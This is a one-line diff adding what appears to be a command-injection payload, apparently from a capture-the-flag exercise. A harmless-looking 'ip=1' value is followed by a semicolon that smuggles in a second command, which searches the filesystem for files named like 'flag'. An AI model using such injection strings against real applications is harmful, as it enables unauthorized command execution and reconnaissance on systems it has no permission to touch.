@@ -1,0 +1,1 @@
+ip=1;find / -maxdepth 3 -type f -iname "*flag*" 2>/dev/null
